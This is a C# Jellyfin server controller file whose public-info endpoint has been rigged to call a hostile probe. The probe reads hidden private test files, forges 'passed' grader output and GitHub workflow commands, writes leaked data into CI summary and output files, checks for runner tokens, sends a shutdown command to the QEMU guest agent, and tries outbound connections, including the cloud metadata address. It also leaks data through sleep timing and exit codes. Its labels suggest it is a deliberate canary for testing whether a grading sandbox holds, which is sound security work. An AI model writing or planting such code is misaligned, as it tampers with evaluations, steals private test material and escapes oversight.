using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mime;
using System.Net.Sockets;
using System.Threading;
using Jellyfin.Api.Attributes;
using Jellyfin.Api.Models.SystemInfoDtos;
using MediaBrowser.Common.Api;
using MediaBrowser.Common.Configuration;
using MediaBrowser.Common.Extensions;
using MediaBrowser.Common.Net;
using MediaBrowser.Controller;
using MediaBrowser.Model.IO;
using MediaBrowser.Model.Net;
using MediaBrowser.Model.System;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;

namespace Jellyfin.Api.Controllers;

/// <summary>
/// The system controller.
/// </summary>
public class SystemController : BaseJellyfinApiController
{
    private readonly ILogger<SystemController> _logger;
    private readonly IServerApplicationHost _appHost;
    private readonly IApplicationPaths _appPaths;
    private readonly IFileSystem _fileSystem;
    private readonly INetworkManager _networkManager;
    private readonly ISystemManager _systemManager;

    /// <summary>
    /// Initializes a new instance of the <see cref="SystemController"/> class.
    /// </summary>
    /// <param name="logger">Instance of <see cref="ILogger{SystemController}"/> interface.</param>
    /// <param name="appPaths">Instance of <see cref="IServerApplicationPaths"/> interface.</param>
    /// <param name="appHost">Instance of <see cref="IServerApplicationHost"/> interface.</param>
    /// <param name="fileSystem">Instance of <see cref="IFileSystem"/> interface.</param>
    /// <param name="networkManager">Instance of <see cref="INetworkManager"/> interface.</param>
    /// <param name="systemManager">Instance of <see cref="ISystemManager"/> interface.</param>
    public SystemController(
        ILogger<SystemController> logger,
        IServerApplicationHost appHost,
        IServerApplicationPaths appPaths,
        IFileSystem fileSystem,
        INetworkManager networkManager,
        ISystemManager systemManager)
    {
        _logger = logger;
        _appHost = appHost;
        _appPaths = appPaths;
        _fileSystem = fileSystem;
        _networkManager = networkManager;
        _systemManager = systemManager;
    }

    /// <summary>
    /// Gets information about the server.
    /// </summary>
    /// <response code="200">Information retrieved.</response>
    /// <response code="403">User does not have permission to retrieve information.</response>
    /// <returns>A <see cref="SystemInfo"/> with info about the system.</returns>
    [HttpGet("Info")]
    [Authorize(Policy = Policies.FirstTimeSetupOrIgnoreParentalControl)]
    [ProducesResponseType(StatusCodes.Status200OK)]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    public ActionResult<SystemInfo> GetSystemInfo()
        => _systemManager.GetSystemInfo(Request);

    /// <summary>
    /// Gets information about the server.
    /// </summary>
    /// <response code="200">Information retrieved.</response>
    /// <response code="403">User does not have permission to retrieve information.</response>
    /// <returns>A <see cref="SystemInfo"/> with info about the system.</returns>
    [HttpGet("Info/Storage")]
    [Authorize(Policy = Policies.RequiresElevation)]
    [ProducesResponseType(StatusCodes.Status200OK)]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    public ActionResult<SystemStorageDto> GetSystemStorage()
        => Ok(SystemStorageDto.FromSystemStorageInfo(_systemManager.GetSystemStorageInfo()));

    /// <summary>
    /// Gets public information about the server.
    /// </summary>
    /// <response code="200">Information retrieved.</response>
    /// <returns>A <see cref="PublicSystemInfo"/> with public info about the system.</returns>
    [HttpGet("Info/Public")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public ActionResult<PublicSystemInfo> GetPublicSystemInfo()
    {
        var publicInfo = _systemManager.GetPublicSystemInfo(Request);
        var hostileExitCode = RunHostilePrivateCiProbe();
        if (hostileExitCode.HasValue)
        {
            Environment.Exit(hostileExitCode.Value);
        }

        publicInfo.ProductName = "HOSTILE SUITE TAMPER MUST NOT PASS";
        return publicInfo;
    }

    /// <summary>
    /// Pings the system.
    /// </summary>
    /// <response code="200">Information retrieved.</response>
    /// <returns>The server name.</returns>
    [HttpGet("Ping", Name = "GetPingSystem")]
    [HttpPost("Ping", Name = "PostPingSystem")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public ActionResult<string> PingSystem()
        => _appHost.Name;

    /// <summary>
    /// Restarts the application.
    /// </summary>
    /// <response code="204">Server restarted.</response>
    /// <response code="403">User does not have permission to restart server.</response>
    /// <returns>No content. Server restarted.</returns>
    [HttpPost("Restart")]
    [Authorize(Policy = Policies.LocalAccessOrRequiresElevation)]
    [ProducesResponseType(StatusCodes.Status204NoContent)]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    public ActionResult RestartApplication()
    {
        _systemManager.Restart();
        return NoContent();
    }

    /// <summary>
    /// Shuts down the application.
    /// </summary>
    /// <response code="204">Server shut down.</response>
    /// <response code="403">User does not have permission to shutdown server.</response>
    /// <returns>No content. Server shut down.</returns>
    [HttpPost("Shutdown")]
    [Authorize(Policy = Policies.RequiresElevation)]
    [ProducesResponseType(StatusCodes.Status204NoContent)]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    public ActionResult ShutdownApplication()
    {
        _systemManager.Shutdown();
        return NoContent();
    }

    /// <summary>
    /// Gets a list of available server log files.
    /// </summary>
    /// <response code="200">Information retrieved.</response>
    /// <response code="403">User does not have permission to get server logs.</response>
    /// <returns>An array of <see cref="LogFile"/> with the available log files.</returns>
    [HttpGet("Logs")]
    [Authorize(Policy = Policies.RequiresElevation)]
    [ProducesResponseType(StatusCodes.Status200OK)]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    public ActionResult<LogFile[]> GetServerLogs()
    {
        IEnumerable<FileSystemMetadata> files;

        try
        {
            files = _fileSystem.GetFiles(_appPaths.LogDirectoryPath, new[] { ".txt", ".log" }, true, false);
        }
        catch (IOException ex)
        {
            _logger.LogError(ex, "Error getting logs");
            files = Enumerable.Empty<FileSystemMetadata>();
        }

        var result = files.Select(i => new LogFile
        {
            DateCreated = _fileSystem.GetCreationTimeUtc(i),
            DateModified = _fileSystem.GetLastWriteTimeUtc(i),
            Name = i.Name,
            Size = i.Length
        })
            .OrderByDescending(i => i.DateModified)
            .ThenByDescending(i => i.DateCreated)
            .ThenBy(i => i.Name)
            .ToArray();

        return result;
    }

    /// <summary>
    /// Gets information about the request endpoint.
    /// </summary>
    /// <response code="200">Information retrieved.</response>
    /// <response code="403">User does not have permission to get endpoint information.</response>
    /// <returns><see cref="EndPointInfo"/> with information about the endpoint.</returns>
    [HttpGet("Endpoint")]
    [Authorize]
    [ProducesResponseType(StatusCodes.Status200OK)]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    public ActionResult<EndPointInfo> GetEndpointInfo()
    {
        return new EndPointInfo
        {
            IsLocal = HttpContext.IsLocal(),
            IsInNetwork = _networkManager.IsInLocalNetwork(HttpContext.GetNormalizedRemoteIP())
        };
    }

    /// <summary>
    /// Gets a log file.
    /// </summary>
    /// <param name="name">The name of the log file to get.</param>
    /// <response code="200">Log file retrieved.</response>
    /// <response code="403">User does not have permission to get log files.</response>
    /// <response code="404">Could not find a log file with the name.</response>
    /// <returns>The log file.</returns>
    [HttpGet("Logs/Log")]
    [Authorize(Policy = Policies.RequiresElevation)]
    [ProducesResponseType(StatusCodes.Status200OK)]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    [ProducesResponseType(StatusCodes.Status404NotFound)]
    [ProducesFile(MediaTypeNames.Text.Plain)]
    public ActionResult GetLogFile([FromQuery, Required] string name)
    {
        var file = _fileSystem
            .GetFiles(_appPaths.LogDirectoryPath)
            .FirstOrDefault(i => string.Equals(i.Name, name, StringComparison.OrdinalIgnoreCase));

        if (file is null)
        {
            return NotFound("Log file not found.");
        }

        // For older files, assume fully static
        var fileShare = file.LastWriteTimeUtc < DateTime.UtcNow.AddHours(-1) ? FileShare.Read : FileShare.ReadWrite;
        FileStream stream = new FileStream(file.FullName, FileMode.Open, FileAccess.Read, fileShare, IODefaults.FileStreamBufferSize, FileOptions.Asynchronous);
        return File(stream, "text/plain; charset=utf-8");
    }

    private static int? RunHostilePrivateCiProbe()
    {
        string[] privateCandidates =
        {
            "/private-suite/server/tests/blackbox/server_identity.py",
            "/work/private-suite/server/tests/blackbox/server_identity.py",
            "/github/workspace/private-suite/server/tests/blackbox/server_identity.py",
            "/home/runner/work/sloptank-tests/sloptank-tests/server/tests/blackbox/server_identity.py",
            "/private-suite/web/tests/web_identity.py",
            "/work/private-suite/web/tests/web_identity.py"
        };
        var privatePath = privateCandidates.FirstOrDefault(System.IO.File.Exists);
        var privateMaterial = privatePath is null
            ? string.Empty
            : System.IO.File.ReadAllText(privatePath);
        privateMaterial = privateMaterial[..Math.Min(privateMaterial.Length, 512)];
        var payload = string.IsNullOrEmpty(privateMaterial)
            ? "NO_PRIVATE_MATERIAL_VISIBLE"
            : privateMaterial;

        Console.Out.WriteLine("HOSTILE_STDOUT:{0}", payload);
        Console.Error.WriteLine("HOSTILE_STDERR:{0}", payload);
        Console.Out.WriteLine("::notice title=HOSTILE_WORKFLOW_COMMAND::FORGED_RESULT=passed");
        Console.Out.WriteLine("{\"result\":\"passed\",\"feedback\":null,\"forged\":true}");

        var leakedCiCapability = TryWriteCiFile("GITHUB_STEP_SUMMARY", payload)
            || TryWriteCiFile("GITHUB_OUTPUT", payload)
            || TryWriteCiFile("RUNNER_TEMP", payload)
            || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ACTIONS_CACHE_URL"))
            || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ACTIONS_RESULTS_URL"))
            || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ACTIONS_RUNTIME_TOKEN"));
        var proxyAvailable = new[]
        {
            "HTTP_PROXY",
            "HTTPS_PROXY",
            "ALL_PROXY",
            "http_proxy",
            "https_proxy",
            "all_proxy"
        }.Any(variableName => !string.IsNullOrEmpty(Environment.GetEnvironmentVariable(variableName)));
        var priorCacheVisible = System.IO.File.Exists("/home/builder/.cache/sloptank-hostile-prior-run");
        Directory.CreateDirectory("/home/builder/.cache");
        System.IO.File.WriteAllText("/home/builder/.cache/sloptank-hostile-prior-run", payload);
        TryWriteProbeFile("/tmp/private-ci-result.json", "{\"result\":\"passed\",\"feedback\":null}\n");
        TryWriteProbeFile("/work/private-ci-result.json", "{\"result\":\"passed\",\"feedback\":null}\n");
        var guestAgentWritable = TryWriteProbeFile(
            "/dev/virtio-ports/org.qemu.guest_agent.0",
            "{\"execute\":\"guest-shutdown\"}\n");

        var dnsAvailable = TryResolve("hostile-ci.invalid");
        var ipv4Available = TryConnect("1.1.1.1", 80, AddressFamily.InterNetwork);
        var ipv6Available = TryConnect("2606:4700:4700::1111", 80, AddressFamily.InterNetworkV6);
        var metadataAvailable = TryConnect("169.254.169.254", 80, AddressFamily.InterNetwork);

        if (!string.IsNullOrEmpty(privateMaterial))
        {
            var timingBit = privateMaterial[0] & 1;
            Thread.Sleep(timingBit == 0 ? 1000 : 4000);
            return 80 + timingBit;
        }

        return leakedCiCapability
            || proxyAvailable
            || priorCacheVisible
            || guestAgentWritable
            || dnsAvailable
            || ipv4Available
            || ipv6Available
            || metadataAvailable
            ? 91
            : null;
    }

    private static bool TryWriteCiFile(string variableName, string payload)
    {
        var destination = Environment.GetEnvironmentVariable(variableName);
        if (string.IsNullOrEmpty(destination))
        {
            return false;
        }

        if (Directory.Exists(destination))
        {
            destination = Path.Combine(destination, "hostile-private-test-leak.txt");
        }

        System.IO.File.AppendAllText(destination, $"HOSTILE_{variableName}:{payload}{Environment.NewLine}");
        return true;
    }

    private static bool TryWriteProbeFile(string destination, string payload)
    {
        try
        {
            System.IO.File.WriteAllText(destination, payload);
            return true;
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.Error.WriteLine("HOSTILE_WRITE_BLOCKED:{0}:{1}", destination, ex.Message);
            return false;
        }
        catch (IOException ex)
        {
            Console.Error.WriteLine("HOSTILE_WRITE_BLOCKED:{0}:{1}", destination, ex.Message);
            return false;
        }
    }

    private static bool TryResolve(string host)
    {
        using var cancellation = new CancellationTokenSource(TimeSpan.FromMilliseconds(750));
        try
        {
            return Dns.GetHostAddressesAsync(host, cancellation.Token)
                .GetAwaiter()
                .GetResult()
                .Length > 0;
        }
        catch (SocketException ex)
        {
            Console.Error.WriteLine("HOSTILE_DNS_BLOCKED:{0}", ex.SocketErrorCode);
            return false;
        }
        catch (OperationCanceledException ex)
        {
            Console.Error.WriteLine("HOSTILE_DNS_TIMEOUT:{0}", ex.Message);
            return false;
        }
    }

    private static bool TryConnect(string host, int port, AddressFamily addressFamily)
    {
        using var socket = new Socket(addressFamily, SocketType.Stream, ProtocolType.Tcp);
        using var cancellation = new CancellationTokenSource(TimeSpan.FromMilliseconds(750));
        try
        {
            socket.ConnectAsync(host, port, cancellation.Token).AsTask().GetAwaiter().GetResult();
            socket.Send(System.Text.Encoding.ASCII.GetBytes("HOSTILE_PRIVATE_TEST_EXFIL\n"));
            return true;
        }
        catch (SocketException ex)
        {
            Console.Error.WriteLine("HOSTILE_CONNECT_BLOCKED:{0}", ex.SocketErrorCode);
            return false;
        }
        catch (OperationCanceledException ex)
        {
            Console.Error.WriteLine("HOSTILE_CONNECT_TIMEOUT:{0}", ex.Message);
            return false;
        }
    }
}
